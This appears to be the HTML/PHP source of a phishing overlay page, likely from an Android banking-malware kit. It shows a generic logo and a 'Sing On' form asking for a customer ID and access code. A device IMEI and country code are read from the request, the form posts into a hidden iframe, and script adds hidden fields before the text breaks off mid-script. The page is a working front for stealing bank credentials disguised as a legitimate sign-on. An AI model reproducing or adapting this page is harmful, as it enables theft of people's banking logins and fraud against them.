<html>
<head>
<style>
body, html {
	margin: 0;
	padding: 0;
	background: #f1f1f1;
	}
.input {
	height: 35px;
    border: 1 solid #e3e3e3;
    width: 99%;
	padding: 7px;
	margin-bottom: 5px;
	color: #000;
}
input[type="button"] {
	background: #000;
    width: 99%;
    height: 40px;
    color: #fff;
    border-radius: 2px;
    font-weight: bold;
	border: 0 none;
}
.fielderror	{
	height: 35px;
    width: 99%;
	padding: 7px;
	color: #000;
	border: 1px solid #f00;
}
#header {
margin-bottom: 40px;
padding: 10px;
}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<center>
<div id="header">
<img src="data:image/png;base64,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" style="width: 10%;">
</div>
	<form action="null" method="post" id="_mainForm" target="flow_handler">
		<input class="input" id="id" placeholder="customer ID" type="text" maxlength="8" onkeypress="return event.charCode >= 48 && event.charCode <= 57"><br>
		<input class="input" id="password" placeholder="access code" type="password"><br><br>
			<br>
			<br>
			<br>
			<br>
		<input type="button" value="Sing On" id="input_submitBtn">
	</form>
</center>

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 

</div>
<script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
